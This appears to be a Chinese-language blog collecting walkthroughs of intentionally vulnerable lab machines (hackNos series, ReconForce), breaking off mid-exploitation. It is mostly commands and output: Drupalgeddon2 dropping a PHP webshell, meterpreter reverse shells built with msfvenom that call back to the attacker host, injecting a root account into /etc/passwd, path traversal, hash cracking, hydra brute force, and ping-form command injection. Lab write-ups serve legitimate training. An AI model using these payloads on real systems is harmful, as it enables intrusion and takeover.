(CODE:200|SIZE:2189) &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;scripts&#x2F; &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;sites&#x2F; &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;themes&#x2F; + http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;web.config (CODE:200|SIZE:2200) + http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;xmlrpc.php (CODE:200|SIZE:42) 漏洞利用 Web服务采用了Drupal框架 搜索得知Drupal框架存在RCE漏洞 git clone https://github.com/dreadlocked/Drupalgeddon2.git 尝试对目标使用Exploit ruby drupalgeddon2.rb http://192.168.56.104/drupal/ 12345678[*] Testing: Writing To Web Root (.&#x2F;)[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php[+] Result : &lt;?php if( isset( $_REQUEST[&#39;c&#39;] ) ) &#123; system( $_REQUEST[&#39;c&#39;] . &#39; 2&gt;&amp;1&#39; ); &#125;[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!--------------------------------------------------------------------------------[i] Fake PHP shell: curl &#39;http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;shell.php&#39; -d &#39;c&#x3D;hostname&#39;hackNos&gt;&gt; iduid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data) 成功获取WebShell 权限提升 查看服务器系统版本 12uname -aLinux hackNos 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:01:15 UTC 2019 i686 i686 i686 GNU&#x2F;Linux 使用weevely编写WebShell 12weevely generate pass wee.phpmv wee.php wee 在服务器上用wget下载WebShell 12wget http:&#x2F;&#x2F;192.168.56.102&#x2F;weemv wee wee.php 连接WebShell weevely http://192.168.56.104/drupal/wee.php pass 使用MSFVenom编写后门 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.102 LPORT=1234 -f elf &gt; msf.elf 在服务器上用WebShell上传后门程序 123456file_upload &#x2F;root&#x2F;software&#x2F;msf.elf &#x2F;var&#x2F;www&#x2F;html&#x2F;drupal&#x2F;msf.elfls -l msf.elf -rw-r--r-- 1 www-data www-data 250 Dec 2 18:37 msf.elfchmod 755 msf.elf -rwxr-xr-x 1 www-data www-data 250 Dec 2 18:37 msf.elfhackNos: .&#x2F;msf.elf &amp; 使用MSF进行渗透攻击 12345use exploit&#x2F;multi&#x2F;handlerset payload linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcpset LHOST 192.168.56.102set LPORT 1234run 将meterpreter shell转为bash 12shellpython3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; 查看具有suid权限且属于root用户的命令 12345678910111213141516171819202122232425find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper &#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign &#x2F;usr&#x2F;lib&#x2F;i386-linux-gnu&#x2F;lxc&#x2F;lxc-user-nic &#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device &#x2F;usr&#x2F;lib&#x2F;snapd&#x2F;snap-confine &#x2F;usr&#x2F;lib&#x2F;policykit-1&#x2F;polkit-agent-helper-1 &#x2F;usr&#x2F;bin&#x2F;pkexec &#x2F;usr&#x2F;bin&#x2F;newgidmap &#x2F;usr&#x2F;bin&#x2F;gpasswd &#x2F;usr&#x2F;bin&#x2F;sudo &#x2F;usr&#x2F;bin&#x2F;newgrp &#x2F;usr&#x2F;bin&#x2F;newuidmap &#x2F;usr&#x2F;bin&#x2F;wget &#x2F;usr&#x2F;bin&#x2F;passwd &#x2F;usr&#x2F;bin&#x2F;chsh &#x2F;usr&#x2F;bin&#x2F;chfn &#x2F;bin&#x2F;ping6 &#x2F;bin&#x2F;umount &#x2F;bin&#x2F;ntfs-3g &#x2F;bin&#x2F;mount &#x2F;bin&#x2F;ping &#x2F;bin&#x2F;su &#x2F;bin&#x2F;fusermount 可以用wget命令提权 对/etc/passwd文件进行间接修改 12345hackNos: file_download &#x2F;etc&#x2F;passwd passwdperl -le &#39;print crypt(&quot;happy_hacker&quot;,&quot;addedsalt&quot;)&#39; ad3sa&#x2F;MFODb7kecho &#39;test:ad3sa&#x2F;MFODb7k:0:0::&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt; passwdhackNos: wget http:&#x2F;&#x2F;192.168.56.102&#x2F;passwd -O &#x2F;etc&#x2F;passwd 在bash中切换账户 1234su testhappy_hackerid uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root) 另一个思路 1234567snap --versionsnap 2.34.2ubuntu0.1 snapd 2.34.2ubuntu0.1 series 16 ubuntu 16.04 kernel 4.4.0-142-generic CVE-2019-7304一把梭 补充一些细节 由于Kali在VMware下而Ubuntu在VBox，导致网络有些问题 Kali可以连通Ubuntu但是反之不行 即Kali可以用EXP获取Shell但Ubuntu不能反弹Shell给Kali 所以需要Windows用MSF接收反弹Shell 在EXP的Shell中，wget获取的文件权限为644且所有者为root，即不能直接wget一个Meterpreter后门程序并执行 但可以用wget获取weevely的WebShell，644的权限且所有者为root并不会影响WebShell的连接，而且在WebShell中，可以进行文件上传和下载，wget所得的文件权限为644，所有者为www-data，即可以用WebShell获取Meterpreter后门程序 在wget一个WebShell之前，要修改文件后缀名 服务器会把php后缀的文件解析并执行，就不能获取该php文件 而修改文件后缀名之后服务器则无法解析，从而获取WebShell 在获取之后修改文件后缀名为.php，并移动到Web目录下 即可连接WebShell 切换用户需要一个标准Shell 可以在Meterpreter中获取 Os-hackNos-2 2020/01/10 23:58:25 端口扫描 nmap -sV -Pn -v -T5 -A 192.168.1.104 12345678910111213141516Nmap scan report for 192.168.1.104Host is up (0.00095s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 94:36:4e:71:6a:83:e2:c1:1e:a9:52:64:45:f6:29:80 (RSA)| 256 b4:ce:5a:c3:3f:40:52:a6:ef:dc:d8:29:f3:2c:b5:d1 (ECDSA)|_ 256 09:6c:17:a1:a3:b4:c7:78:b9:ad:ec:de:8f:64:b1:7b (ED25519)80&#x2F;tcp open http Apache httpd 2.4.29 ((Ubuntu))| http-methods: |_ Supported Methods: GET POST OPTIONS HEAD|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It worksMAC Address: 08:00:27:D8:5B:21 (Oracle VirtualBox virtual NIC)Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Netgear ReadyNAS device (RAIDiator 4.2.21 - 4.2.27) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%) Web路径枚举 dirb http://192.168.1.104 -w 123456789---- Scanning URL: http:&#x2F;&#x2F;192.168.1.104&#x2F; ----+ http:&#x2F;&#x2F;192.168.1.104&#x2F;index.html (CODE:200|SIZE:10918) + http:&#x2F;&#x2F;192.168.1.104&#x2F;server-status (CODE:403|SIZE:278) &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F; ---- Entering directory: http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F; ----+ http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;index.php (CODE:301|SIZE:0) &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;wp-admin&#x2F; &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;wp-content&#x2F; 漏洞利用 Web服务采用了Wordpress框架 使用wpscan针对wordpress进行扫描 wpscan --url http://192.168.1.104/tsweb/ --enumerate u 123456789[i] User(s) Identified:[+] user | Found By: Rss Generator (Passive Detection) | Confirmed By: | Wp Json Api (Aggressive Detection) | - http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;index.php&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;?per_page&#x3D;100&amp;page&#x3D;1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) 发现存在用户user wpscan --url http://192.168.1.104/tsweb/ --enumerate p 1234567891011121314[i] Plugin(s) Identified:[+] gracemedia-media-player | Location: http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;wp-content&#x2F;plugins&#x2F;gracemedia-media-player&#x2F; | Latest Version: 1.0 (up to date) | Last Updated: 2013-07-21T15:09:00.000Z | | Found By: Urls In Homepage (Passive Detection) | | Version: 1.0 (100% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;wp-content&#x2F;plugins&#x2F;gracemedia-media-player&#x2F;readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;wp-content&#x2F;plugins&#x2F;gracemedia-media-player&#x2F;readme.txt 存在插件gracemedia-media-player 搜索得到相关EXP wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&amp;cfg=../../../../../../../../../../etc/passwd 得到两条重要信息 rohit:x:1000:1000:hackNos:/home/rohit:/bin/bash flag:$1$flag$vqjCxzjtRc7PofLYS2lWf/:1001:1003::/home/flag:/bin/rbash 可以破解flag账户的密码 使用john进行字典爆破 12345echo &#39;$1$flag$vqjCxzjtRc7PofLYS2lWf&#x2F;&#39; &gt; passwdjohn --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlist&#x2F;rockyou.txt --format&#x3D;md5crypt-long passwdjohn --show passwdtopsecret 使用flag账户登入 12ssh flag@192.168.1.104topsecret 权限提升 而登入时使用的是rbash，在进行操作时会很不方便，需要切换到bash 123python -c &#39;import os; os.system(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;perl -e &#39;exec &quot;&#x2F;bin&#x2F;bash&quot;;&#39;awk &#39;BEGIN &#123;system(&quot;&#x2F;bin&#x2F;bash&quot;)&#125;&#39; 以上三条命令均可(但是更推荐用下面的方法获取TTY) 或者使用python获取一个支持完全交互的TTY(如果目标机器上只有python3而没有python2，则改为python3执行即可) 1python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; 尝试直接sudo提权，失败 尝试在目标服务器内搜索信息 发现文件/var/backups/passbkp/md5-hash 123cat &#x2F;var&#x2F;backups&#x2F;passbkp&#x2F;md5-hash $1$rohit$01Dl0NQKtgfeL08fGrggi0 得到rohit账户的密码 使用john破解密码 12345echo &#39;$1$rohit$01Dl0NQKtgfeL08fGrggi0&#39; &gt; passwd2john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlist&#x2F;rockyou.txt --format&#x3D;md5crypt-long passwd2john --show passwd2!%hack41 切换到rohit账户，并尝试sudo提权 123456su rohit!%hack41sudo -i!%hack41iduid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root) 总体来看渗透难度并不高，但是这里我想稍微记录一些关于wpscan的内容 wpscan是一个基于ruby，针对wordpress框架的web扫描器 但是之前kali上一直运行不了wpscan，一直以为是wpscan软件的问题，多次失败之后才发现是ruby的问题 官网有这么一句话 (Optional but highly recommended: RVM) 现在看来也觉得确实如此 所以一番折腾之后终于在非root用户上安装好了rvm，然后换ruby源，安装ruby2.5.5，换gem源，再用gem安装一遍wpscan 最后终归是能正常使用wpscan了 参考资料 rvm rvm wpscan rvm wp Os-hackNos-3 2020/01/19 21:46:32 端口扫描 nmap -p 1-65535 -sV -A -v -T 5 -n 192.168.31.39 1234567891011121314151617Nmap scan report for 192.168.31.39Host is up (0.0013s latency).Not shown: 65533 closed portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 ce:16:a0:18:3f:74:e9:ad:cb:a9:39:90:11:b8:8a:2e (RSA)| 256 9d:0e:a1:a3:1e:2c:4d:00:e8:87:d2:76:8c:be:71:9a (ECDSA)|_ 256 63:b3:75:98:de:c1:89:d9:92:4e:49:31:29:4b:c0:ad (ED25519)80&#x2F;tcp open http Apache httpd 2.4.41 ((Ubuntu))| http-methods: |_ Supported Methods: GET POST OPTIONS HEAD|_http-server-header: Apache&#x2F;2.4.41 (Ubuntu)|_http-title: WebSecMAC Address: 08:00:27:19:3A:EE (Oracle VirtualBox virtual NIC)Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Netgear ReadyNAS device (RAIDiator 4.2.21 - 4.2.27) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)No exact OS matches for host (test conditions non-ideal). Web路径枚举 尝试爆破80端口下的Web路径 未发现有效信息 在主页处有提示 12find the BugYou need extra WebSec 发现存在Web路径/websec 再针对该路径进一步扫描 dirb http://192.168.31.39/websec/ -w 12345678910111213141516171819202122232425262728293031---- Scanning URL: http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F; ----+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;0 (CODE:200|SIZE:4346) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;01 (CODE:200|SIZE:4644) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;1 (CODE:200|SIZE:4644) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;1x1 (CODE:200|SIZE:4644) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;about (CODE:200|SIZE:3754) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;About (CODE:200|SIZE:3754) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;admin (CODE:200|SIZE:1591) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;api (CODE:200|SIZE:0) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;assets (CODE:301|SIZE:333) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;author (CODE:200|SIZE:4208) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;blog (CODE:200|SIZE:4346) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;category (CODE:200|SIZE:4366) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;cm (CODE:500|SIZE:0) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;feed (CODE:200|SIZE:765) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;fm (CODE:200|SIZE:0) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;index (CODE:200|SIZE:4346) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;Index (CODE:200|SIZE:4346) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;lib (CODE:301|SIZE:327) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;log (CODE:301|SIZE:327) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;login (CODE:200|SIZE:1591) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;robots.txt (CODE:200|SIZE:65) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;search (CODE:200|SIZE:4346) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;Search (CODE:200|SIZE:4346) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;sites (CODE:301|SIZE:331) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;src (CODE:301|SIZE:327) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;tag (CODE:200|SIZE:4361) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;tags (CODE:200|SIZE:3554) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;test (CODE:301|SIZE:329) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;themes (CODE:301|SIZE:333) + http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;tmp (CODE:301|SIZE:327) 漏洞利用 WEB服务存在登录页面 主页中已经给出了一个联系邮箱:contact@hacknos.com 可以利用hydra进行口令枚举 使用top6000弱口令进行枚举 1hydra -I -l contact@hacknos.com -P FuzzDicts-master&#x2F;passwordDict&#x2F;top6000.txt -vV -f 192.168.31.39 http-post-form &quot;&#x2F;websec&#x2F;login:username&#x3D;^USER^&amp;password&#x3D;^PASS^:Wrong&quot; 未获得账户口令 使用cewl获取页面内容来作为口令 cewl http://192.168.31.39/websec -w pass 使用网站内容作来枚举账户口令 123hydra -I -l contact@hacknos.com -P pass -vV -f 192.168.31.39 http-post-form &quot;&#x2F;websec&#x2F;login:username&#x3D;^USER^&amp;password&#x3D;^PASS^:Wrong&quot;[80][http-post-form] host: 192.168.31.39 login: contact@hacknos.com password: Securityx 得到Web账户权限 权限提升 Web页面中可以在左侧菜单中选择Content &gt; File Manager来管理文件 尝试写入Webshell，但是无法访问到文件 尝试使用msfvenom创建基于php的meterpreter后门，再写入到index.php中 12msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.31.10 LPORT&#x3D;2020 -f raw &gt; shell.phpcat shell.php 将内容复制到index.php文件末 在MSF中接收Meterpreter 12345use exploit&#x2F;multi&#x2F;handlerset payload php&#x2F;meterpreter&#x2F;reverse_tcpset LHOST 192.168.31.10set LPORT 2020run 在Meterpreter的shell中切换至交互shell 123shellid uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data) 查看/etc/passwd文件 123456789101112131415161718192021222324252627282930313233343536cat &#x2F;etc&#x2F;passwdroot:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bashdaemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologinbin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologinsys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologinsync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;syncgames:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologinman:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologinlp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologinmail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologinnews:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologinuucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologinproxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologinwww-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologinbackup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologinlist:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologinirc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologingnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologinnobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologinsystemd-timesync:x:100:102:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologinsystemd-network:x:101:103:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologinsystemd-resolve:x:102:104:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologinmessagebus:x:103:106::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologinsyslog:x:104:110::&#x2F;home&#x2F;syslog:&#x2F;usr&#x2F;sbin&#x2F;nologin_apt:x:105:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologinuuidd:x:106:111::&#x2F;run&#x2F;uuidd:&#x2F;usr&#x2F;sbin&#x2F;nologintcpdump:x:107:112::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologinlandscape:x:108:114::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;usr&#x2F;sbin&#x2F;nologinpollinate:x:109:1::&#x2F;var&#x2F;cache&#x2F;pollinate:&#x2F;bin&#x2F;falsesshd:x:110:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologinsystemd-coredump:x:999:999:systemd Core Dumper:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologinblackdevil:x:1000:118:hackNos:&#x2F;home&#x2F;blackdevil:&#x2F;bin&#x2F;bashlxd:x:998:100::&#x2F;var&#x2F;snap&#x2F;lxd&#x2F;common&#x2F;lxd:&#x2F;bin&#x2F;falsemysql:x:111:116:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;falsednsmasq:x:112:65534:dnsmasq,,,:&#x2F;var&#x2F;lib&#x2F;misc:&#x2F;usr&#x2F;sbin&#x2F;nologin 发现文件/var/local/database 12345678910cat &#x2F;var&#x2F;local&#x2F;databaseExpensesSoftware Licenses,$2.78Maintenance,$68.87Mortgage Interest,$70.35Advertising,$9.78Phone,$406.80Insurance,$9.04Opss;fackespreadsheet 得到提示fackespreadsheet 在某个不存在的网站上搜索得到在线解密工具 http://www.spammimic.com/spreadsheet.php?action=decode 解密得Security@x@ 尝试以此作为口令登入blackdevil账户 1234ssh blackdevil@192.168.31.39Security@x@id uid&#x3D;1000(blackdevil) gid&#x3D;118(docker) groups&#x3D;118(docker),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lxd) 尝试sudo提权 1234sudo -iSecurity@x@id uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root) hydra在用于爆破Web登录时需要调整的参数有点多 http请求类型 数据的参数名 登录成功/失败时所回应的信息 由于登陆失败会回应Wrong email or password 所以借以该信息来判断是否登入成功 获取Webshell时有些麻烦，一开始以为是传统的php一句话上传，结果发现上传的文件都不能打开，屡次尝试后转而使用Meterpreter获取Shell 解密过程的脑洞较大(感觉像是玩CTF的古典密码…)，善用搜索引擎总归是件好事 参考资料 WP hydra ReconForce 2020/02/02 20:17:42 端口扫描 nmap -p 1-65535 -sV -A -v -T 5 -n 192.168.31.109 1234567891011121314151617181920212223242526272829303132Nmap scan report for 192.168.31.109Host is up (0.00063s latency).Not shown: 65532 closed portsPORT STATE SERVICE VERSION21&#x2F;tcp open ftp vsftpd 2.0.8 or later|_ftp-anon: Anonymous FTP login allowed (FTP code 230)| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:192.168.31.10| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 5| vsFTPd 3.0.3 - secure, fast, stable|_End of status22&#x2F;tcp open ssh OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 6f:96:94:65:72:80:08:93:23:90:20:bc:76:df:b8:ec (RSA)| 256 6f:bb:49:1a:a9:b6:e5:00:84:19:a0:e4:2b:c4:57:c4 (ECDSA)|_ 256 ce:3d:94:05:f4:a6:82:c4:7f:3f:ba:37:1d:f6:23:b0 (ED25519)80&#x2F;tcp open http Apache httpd 2.4.41 ((Ubuntu))| http-methods: |_ Supported Methods: GET POST OPTIONS HEAD|_http-server-header: Apache&#x2F;2.4.41 (Ubuntu)|_http-title: Recon_WebMAC Address: 08:00:27:83:C2:54 (Oracle VirtualBox virtual NIC)Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Netgear ReadyNAS device (RAIDiator 4.2.21 - 4.2.27) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)No exact OS matches for host (test conditions non-ideal). Web路径枚举 尝试爆破80端口下的Web路径 未发现有效信息 在主页处存在一个链接导向/5ecure/路径 存在Basic认证，而且附带一个提示信息Recon Security 漏洞利用 FTP服务允许匿名登录 12ftp 192.168.31.109anonymous 匿名登入之后发现不能进行进一步的操作 发现Banner为Secure@hackNos 使用cewl生成字典 cewl http://192.168.31.109/ &gt;&gt; data 添加一些常用词以及获取到的一些信息 123456echo &quot;root&quot; &gt;&gt; dataecho &quot;admin&quot; &gt;&gt; dataecho &quot;Recon Security&quot; &gt;&gt; dataecho &quot;Secure@hackNos&quot; &gt;&gt; dataecho &quot;5ecure&quot; &gt;&gt; dataecho &quot;&quot; &gt;&gt; data Basic认证是基于Get请求进行的，需要附加的一个Head–Authorization，而其内容为Basic xxxxxxxx，其中xxxxxxxx为user:pass进行base64编码之后的结果 使用python脚本转变为相应的格式 12345678910111213141516171819202122#test.pyimport base64raw &#x3D; [ &#39;Recon&#39;, &#39;Web&#39;, &#39;Home&#39;, &#39;Service&#39;, &#39;Blog&#39;, &#39;hackNos&#39;, &#39;TroubleShoot&#39;, &#39;Security&#39;, &#39;Recon Security&#39;, &#39;Secure&#39;, &#39;root&#39;, &#39;5ecure&#39;, &#39;admin&#39;, &#39;Secure@hackNos&#39;, &#39;Security@hackNos&#39;, &#39;&#39;]for i in raw: for j in raw: print base64.b64encode(j + &#39;:&#39; + i) ./test.py &gt; b64.dir 然后在Burp中使用生成的字典进行破解 在爆破的时候遇到了问题，没有爆破出来账户，无奈之下只好在网上看看其他大神的思路，发现貌似作者是想在FTP Banner里写上Security@hackNos但实际写成了Secure@hackNos 修改一下脚本里面的raw数组之后发现爆破成功了 账户为admin:Security@hackNos 进入/5ecure/路径之后发现是一个ping工具，结合一下CTF的内容不难想到这个就是命令注入了，命令执行是在out.php下执行的，而且ping的结果会有回显 &amp; &amp;&amp; | || ; 用这几个符号挨个尝试命令注入 发现127.0.0.1|ls可以列出当前目录下的文件 127.0.0.1|cat /etc/passwd 也能读取passwd文件 尝试写入phpinfo 127.0.0.1|echo '&lt;?php phpinfo();?&gt;' &gt; 1.php 但是访问1.php时phpinfo未显示，可能存在过滤 127.0.0.1|echo '&lt;?php phpinfo();?&gt;' &gt; 1.txt 1.txt中显示的是&lt;?php phpinfo;?&gt; 看样子是过滤掉了小括号 查看out.php 127.0.0.1|cat out.php 123456789101112131415161718192021222324252627282930313233343536373839&lt;?phpif( isset( $_POST[ &#39;Submit&#39; ] ) ) &#123; &#x2F;&#x2F; Get input $target &#x3D; trim($_REQUEST[ &#39;ip&#39; ]); &#x2F;&#x2F; Set blacklist $substitutions &#x3D; array( &#39;&amp;&#39; &#x3D;&gt; &#39;&#39;, &#39;;&#39; &#x3D;&gt; &#39;&#39;, &#39;| &#39; &#x3D;&gt; &#39;&#39;, &#39;-&#39; &#x3D;&gt; &#39;&#39;, &#39;$&#39; &#x3D;&gt; &#39;&#39;, &#39;(&#39; &#x3D;&gt; &#39;&#39;, &#39;)&#39; &#x3D;&gt; &#39;&#39;, &#39;&#96;&#39; &#x3D;&gt; &#39;&#39;, &#39;||&#39; &#x3D;&gt; &#39;&#39;, ); &#x2F;&#x2F; Remove any of the charactars in the array (blacklist). $target &#x3D; str_replace( array_keys( $substitutions ), $substitutions, $target ); &#x2F;&#x2F; Determine OS and execute the ping command. if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123; &#x2F;&#x2F; Windows $cmd &#x3D; shell_exec( &#39;ping &#39; . $target ); &#125; else &#123; &#x2F;&#x2F; *nix $cmd &#x3D; shell_exec( &#39;ping -c 4 &#39; . $target ); &#125; &#x2F;&#x2F; Feedback for the end user echo &quot;&#123;$cmd&#125;&quot;;&#125;?&gt; 可以看到过滤掉了一些特殊符号，尝试使用wget命令来下载后门 使用msfvenom创建基于php的meterpreter后门 1msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.31.10 LPORT&#x3D;2020 -f raw &gt; shell.php 